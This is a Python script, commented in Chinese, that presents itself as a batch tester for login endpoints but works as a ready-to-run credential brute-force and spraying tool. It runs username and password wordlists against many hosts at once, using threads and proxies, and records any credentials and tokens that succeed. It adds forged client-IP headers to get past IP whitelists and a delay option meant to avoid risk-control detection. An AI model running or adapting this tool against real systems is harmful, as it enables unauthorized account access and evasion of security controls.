#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
登录接口批量测试脚本
- 支持自定义 HOST
- 支持批量目标/批量账号
- 支持 HTTP/HTTPS/SOCKS5 代理
- 成功/失败判定基于响应 code 字段
- 结果保存到 logs 目录
"""

import argparse
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    print("[!] 缺少 requests 库，请先安装： pip install requests")
    sys.exit(1)

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


# ---------- 固定报文（来自原抓包） ----------
DEFAULT_PATH = "/api/user/login"
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json; charset=UTF-8",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Sec-Ch-Ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

# 原始抓包中的伪 X-Forwarded 系列（保留以便目标白名单场景使用，可开关）
SPOOF_HEADERS = {
    "Wl-Proxy-Client-Ip": "127.0.0.1",
    "Cf-Connecting-Ip": "127.0.0.1",
    "Cdn-Real-Ip": "127.0.0.1",
    "Cdn-Src-Ip": "127.0.0.1",
    "Ali-Cdn-Real-Ip": "127.0.0.1",
    "Client-Ip": "127.0.0.1",
    "True-Client-Ip": "127.0.0.1",
    "Forwarded": "127.0.0.1",
    "Forwarded-For": "127.0.0.1",
    "X-Cluster-Client-Ip": "127.0.0.1",
    "X-Forwarded": "127.0.0.1",
    "X-Real-Ip": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Remote-Ip": "127.0.0.1",
    "X-Originating-Ip": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
}


# ===================== 工具函数 =====================

def normalize_host(host: str, default_scheme: str = "https") -> str:
    """接受 host 或 host:port 或带 scheme 的 URL，统一返回 scheme://host[:port]
    default_scheme: 用户未指定 scheme 时使用的协议，默认 https
    """
    h = host.strip()
    if not h:
        raise ValueError("HOST 不能为空")
    if "://" not in h:
        h = f"{default_scheme}://" + h
    p = urlparse(h)
    if not p.netloc:
        raise ValueError(f"HOST 解析失败: {host}")
    return f"{p.scheme}://{p.netloc}"


def build_proxy(args):
    """根据参数构造 requests proxies 字典"""
    if not args.proxy:
        return None
    p = args.proxy.strip()
    # socks5 走 requests + urllib3，需 pip install requests[socks] / PySocks
    if p.startswith(("socks5://", "socks5h://", "socks4://")):
        proxies = {"http": p, "https": p}
    else:
        # 自动补 scheme
        if not p.startswith(("http://", "https://")):
            p = "http://" + p
        proxies = {"http": p, "https": p}
    return proxies


def load_list_file(path: str):
    """逐行加载文件，跳过空行与 # 注释"""
    if not path:
        return []
    if not os.path.isfile(path):
        print(f"[!] 字典文件不存在: {path}")
        return []
    items = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            items.append(s)
    return items


def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# ===================== 核心请求 =====================

def try_login(host_base: str, path: str, username: str, password: str,
              proxies, timeout: int, use_spoof: bool, verify_ssl: bool):
    """
    发起一次登录请求，返回 (status_code, code, message, token, raw_text, cost)
    - http_status: HTTP 状态码
    - code: 业务 code 字段（200=成功，401=失败等）
    - message: 业务 message
    - token: 成功时的 token（可能为空）
    """
    url = host_base.rstrip("/") + path

    headers = dict(DEFAULT_HEADERS)
    headers["Origin"] = host_base
    if use_spoof:
        headers.update(SPOOF_HEADERS)

    body = json.dumps({"username": username, "password": password})

    t0 = time.time()
    try:
        resp = requests.post(
            url,
            data=body,
            headers=headers,
            proxies=proxies,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
        )
        cost = time.time() - t0
        raw = resp.text
        try:
            j = resp.json()
        except Exception:
            j = {}

        code = j.get("code")
        msg = j.get("message", "")
        token = ""
        data = j.get("data") or {}
        if isinstance(data, dict):
            token = data.get("token", "")

        return {
            "ok": True,
            "http_status": resp.status_code,
            "code": code,
            "message": msg,
            "token": token,
            "raw": raw,
            "cost": round(cost, 3),
        }
    except requests.exceptions.ProxyError as e:
        return {"ok": False, "error": f"代理错误: {e}"}
    except requests.exceptions.SSLError as e:
        return {"ok": False, "error": f"SSL 错误: {e}"}
    except requests.exceptions.Timeout:
        return {"ok": False, "error": "请求超时"}
    except requests.exceptions.ConnectionError as e:
        return {"ok": False, "error": f"连接错误: {e}"}
    except Exception as e:
        return {"ok": False, "error": f"未知错误: {e}"}


def is_success(result, success_code):
    """判定是否登录成功：业务 code == success_code（默认 200）"""
    return result.get("ok") and result.get("code") == success_code


# ===================== 主流程 =====================

def parse_args():
    ap = argparse.ArgumentParser(
        description="登录接口批量测试（支持多 HOST、批量账号、代理）",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    ap.add_argument("-H", "--host", action="append",
                    help="目标 HOST，可写 host:port 或完整 URL，可多次传")
    ap.add_argument("--hosts-file", dest="hosts_file",
                    help="从文件读取 HOST 列表（每行一个）", metavar="FILE")
    ap.add_argument("-p", "--path", default=DEFAULT_PATH, help=f"登录路径，默认 {DEFAULT_PATH}")
    ap.add_argument("-u", "--username", action="append", help="单个用户名，可多次传")
    ap.add_argument("-U", "--usernames-file", dest="usernames_file", help="用户名字典文件")
    ap.add_argument("-P", "--password", action="append", help="单个密码，可多次传")
    ap.add_argument("-w", "--passwords-file", dest="passwords_file", help="密码字典文件")

    ap.add_argument("--proxy", help="代理地址，如 http://127.0.0.1:8080 或 socks5://127.0.0.1:1080")
    ap.add_argument("--scheme", choices=["http", "https"], default="https",
                    help="HOST 未指定协议时使用的默认协议，默认 https")
    ap.add_argument("--timeout", type=int, default=10, help="单次请求超时秒，默认 10")
    ap.add_argument("--threads", type=int, default=5, help="并发线程数，默认 5")
    ap.add_argument("--delay", type=float, default=0.0, help="每次请求前睡眠秒数（避免触发风控）")
    ap.add_argument("--no-spoof", action="store_true", help="不发送伪造的 X-Forwarded-* 头")
    ap.add_argument("--insecure", action="store_true", help="忽略 SSL 证书校验")
    ap.add_argument("--success-code", type=int, default=200,
                    help="判定为成功的业务 code，默认 200")
    ap.add_argument("--out", default="logs", help="结果输出目录，默认 logs")
    return ap


def collect_targets(args):
    """收集所有需要测试的 HOST"""
    hosts = []
    if args.host:
        # action="append" 时是 list
        if isinstance(args.host, list):
            hosts.extend(args.host)
        else:
            hosts.append(args.host)
    if args.hosts_file:
        hosts.extend(load_list_file(args.hosts_file))
    # 去重保持顺序
    seen = set()
    uniq = []
    for h in hosts:
        h = h.strip()
        if h and h not in seen:
            seen.add(h)
            uniq.append(h)
    return uniq


def collect_users(args):
    users = []
    if args.username:
        if isinstance(args.username, list):
            users.extend(args.username)
        else:
            users.append(args.username)
    if args.usernames_file:
        users.extend(load_list_file(args.usernames_file))
    seen = set()
    uniq = []
    for u in users:
        u = u.strip()
        if u and u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def collect_pass(args):
    pwds = []
    if args.password:
        if isinstance(args.password, list):
            pwds.extend(args.password)
        else:
            pwds.append(args.password)
    if args.passwords_file:
        pwds.extend(load_list_file(args.passwords_file))
    seen = set()
    uniq = []
    for p in pwds:
        p = p.strip()
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


def worker(host_base, path, u, p, proxies, args):
    if args.delay > 0:
        time.sleep(args.delay)
    res = try_login(
        host_base=host_base,
        path=path,
        username=u,
        password=p,
        proxies=proxies,
        timeout=args.timeout,
        use_spoof=not args.no_spoof,
        verify_ssl=not args.insecure,
    )
    return host_base, u, p, res


def main():
    ap = parse_args()
    args = ap.parse_args()

    hosts = collect_targets(args)
    users = collect_users(args)
    pwds = collect_pass(args)

    if not hosts:
        hosts = ["192.168.1.8:5003"]  # 兼容原抓包 HOST
    if not users:
        users = ["admin"]
    if not pwds:
        pwds = ["arlpass"]

    print(f"[*] {now_str()} 启动")
    print(f"[*] 默认协议: {args.scheme}（用户传完整 URL 时按 URL 走）")
    print(f"[*] 目标数: {len(hosts)}  用户数: {len(users)}  密码数: {len(pwds)}  "
          f"组合: {len(hosts) * len(users) * len(pwds)}")
    print(f"[*] 代理: {args.proxy or '直连'}")
    print(f"[*] 并发: {args.threads}  超时: {args.timeout}s  延时: {args.delay}s  "
          f"伪造头: {'否' if args.no_spoof else '是'}  忽略证书: {'是' if args.insecure else '否'}")

    proxies = build_proxy(args)

    # 输出目录
    os.makedirs(args.out, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = os.path.join(args.out, f"result_{stamp}.log")
    csv_path = os.path.join(args.out, f"result_{stamp}.csv")
    success_path = os.path.join(args.out, f"success_{stamp}.txt")
    log_f = open(log_path, "a", encoding="utf-8")
    log_f.write(f"# {now_str()} 启动\n")
    log_f.write(f"# targets={hosts} users={users} passwords={pwds}\n")
    log_f.write(f"# proxy={args.proxy} threads={args.threads} success_code={args.success_code}\n")
    log_f.flush()
    csv_f = open(csv_path, "a", encoding="utf-8")
    csv_f.write("time,host,username,password,http_status,code,message,token,cost,error\n")
    csv_f.flush()
    suc_f = open(success_path, "a", encoding="utf-8")

    total = len(hosts) * len(users) * len(pwds)
    done = 0
    success_count = 0
    fail_count = 0
    err_count = 0

    tasks = []
    for h in hosts:
        try:
            host_base = normalize_host(h, default_scheme=args.scheme)
        except ValueError as e:
            print(f"[!] 跳过非法 HOST '{h}': {e}")
            continue
        for u in users:
            for p in pwds:
                tasks.append((host_base, args.path, u, p))

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs = [pool.submit(worker, h, path, u, p, proxies, args)
                for (h, path, u, p) in tasks]
        for fut in as_completed(futs):
            host_base, u, p, res = fut.result()
            done += 1
            tag = ""
            if not res.get("ok"):
                err_count += 1
                line = (f"[{now_str()}] [ERR ] {host_base} {u}:{p} -> {res.get('error')}")
                tag = "ERR"
            elif is_success(res, args.success_code):
                success_count += 1
                line = (f"[{now_str()}] [OK  ] {host_base} {u}:{p} "
                        f"http={res['http_status']} code={res['code']} "
                        f"token={res['token']} cost={res['cost']}s")
                tag = "OK"
                suc_f.write(f"{host_base}\t{u}\t{p}\t{res['token']}\n")
                suc_f.flush()
            else:
                fail_count += 1
                line = (f"[{now_str()}] [FAIL] {host_base} {u}:{p} "
                        f"http={res['http_status']} code={res['code']} "
                        f"msg={res['message']} cost={res['cost']}s")
                tag = "FAIL"
            print(line)
            log_f.write(line + "\n")
            log_f.flush()

            if not res.get("ok"):
                err = (res.get('error', '') or '').replace('"', '""')
                csv_f.write(f"{now_str()},{host_base},{u},{p},,,,,\"{err}\"\n")
            else:
                msg = (res['message'] or '').replace('"', '""')
                tok = (res['token'] or '').replace('"', '""')
                csv_f.write(f"{now_str()},{host_base},{u},{p},"
                            f"{res['http_status']},{res['code']},\"{msg}\","
                            f"\"{tok}\",{res['cost']},\n")
            csv_f.flush()

            if done % 20 == 0 or done == total:
                print(f"[*] 进度 {done}/{total}  成功 {success_count}  "
                      f"失败 {fail_count}  错误 {err_count}")

    log_f.write(f"# {now_str()} 完成 成功={success_count} 失败={fail_count} 错误={err_count}\n")
    log_f.close()
    csv_f.close()
    suc_f.close()
    print(f"\n[+] 完成: 成功 {success_count}  失败 {fail_count}  错误 {err_count}")
    print(f"[+] 详细日志: {log_path}")
    print(f"[+] CSV 结果: {csv_path}")
    if success_count:
        print(f"[+] 成功记录: {success_path}")


if __name__ == "__main__":
    main()
